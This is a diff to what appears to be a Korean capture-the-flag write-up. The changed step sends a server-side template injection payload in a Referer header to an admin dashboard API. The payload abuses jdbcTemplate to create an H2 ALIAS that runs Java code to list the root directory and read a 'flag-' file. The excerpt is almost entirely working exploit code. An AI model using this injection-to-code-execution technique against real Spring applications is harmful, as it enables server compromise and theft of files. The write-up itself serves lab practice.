@@ -207,9 +207,13 @@ echo "$ADMIN_TOKEN"
 (1) ALIAS 생성:
 
 ```bash
+read -r -d '' REFERER <<'EOF'
+' + ${@jdbcTemplate.execute('CREATE ALIAS IF NOT EXISTS GETFLAG2 AS $$ String getflag2() throws Exception { try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).findFirst().orElse(null); if (p==null) return "NF"; return java.nio.file.Files.readString(p); } } $$')} + '
+EOF
+
 curl -s "$TARGET/api/admin/dashboard" \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
-  -H $'Referer: \x27 + ${@jdbcTemplate.execute(\'CREATE ALIAS IF NOT EXISTS GETFLAG2 AS $$ String getflag2() throws Exception { try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).findFirst().orElse(null); if (p==null) return "NF"; return java.nio.file.Files.readString(p); } } $$\')} + \x27' \
+  -H "Referer: $REFERER" \
   >/dev/null
 ```
 
